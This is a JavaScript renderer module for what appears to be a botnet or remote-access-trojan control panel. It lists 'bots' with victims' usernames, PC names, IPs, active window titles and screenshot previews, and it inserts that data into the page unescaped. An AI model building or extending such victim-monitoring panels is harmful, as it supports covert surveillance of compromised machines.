// frontend/dashboard/js/modules/ui/renderer.js

let isGridView = false;

// Вспомогательные утилиты для чистоты шаблонов
const getStatus = (s) => s === 'online';
const getFlag = (loc) => `https://flagcdn.com/16x12/${(loc || 'un').toLowerCase()}.png`;
const renderFlag = (loc) => `<img src="${getFlag(loc)}" class="flag-icon" onerror="this.src='${getFlag('un')}'">`;

export const Renderer = {
    toggleView() {
        isGridView = !isGridView;
        window.dispatchEvent(new CustomEvent('viewToggled', { detail: isGridView }));
        return isGridView;
    },

    render(clients) {
        const t = document.getElementById('table-container');
        const g = document.getElementById('grid-view');
        if (!t || !g) return;

        t.classList.toggle('hidden', isGridView);
        g.classList.toggle('hidden', !isGridView);

        isGridView ? this.drawGrid(clients, g) : this.drawTable(clients);
    },

    drawTable(clients) {
        const el = document.getElementById('clients-list');
        if (!el) return;

        el.innerHTML = clients.length ? clients.map(c => {
            const online = getStatus(c.status);
            const sClass = online ? 'status-online' : 'status-offline';

            return `
            <tr class="client-row" data-client-id="${c.id}">
                <td>
                    <span class="status-dot-mini ${online ? 'online' : 'offline'}"></span>
                    ${renderFlag(c.loc)} ${c.loc || '??'}
                </td>
                <td>${c.user || 'Anon'}</td>
                <td>${c.pc_name || 'PC'}</td>
                <td class="${sClass}">${c.last_active || '--'}</td>
                <td class="${sClass}">${c.ip || '0.0.0.0'}</td>
                <td class="text-truncate" title="${c.active_window || ''}">${c.active_window || 'Idle'}</td>
                <td class="client-id-cell">${c.id}</td>
            </tr>`;
        }).join('') : '<tr><td colspan="7" class="empty-msg">No bots found</td></tr>';
    },

    drawGrid(clients, container) {
        container.innerHTML = clients.length ? clients.map(c => {
            const online = getStatus(c.status);

            return `
            <div class="client-card" data-client-id="${c.id}">
                <div class="card-status-dot ${online ? 'online' : 'offline'}"></div>
                <div class="bot-preview"><img src="../images/test2.jpg" alt="Preview"></div>
                <div class="bot-card-body">
                    <div class="bot-primary-info">
                        <span><i class="fas fa-user"></i> ${c.user || 'Anon'}</span>
                        <span>${renderFlag(c.loc)} ${c.loc || '??'}</span>
                    </div>
                    <div class="bot-secondary-info">
                        <span class="${online ? 'status-online' : 'status-offline'}">${c.ip || '0.0.0.0'}</span>
                        <span class="bot-id">#${c.id}</span>
                    </div>
                </div>
            </div>`;
        }).join('') : '<div class="empty-msg">No bots found</div>';
    }
};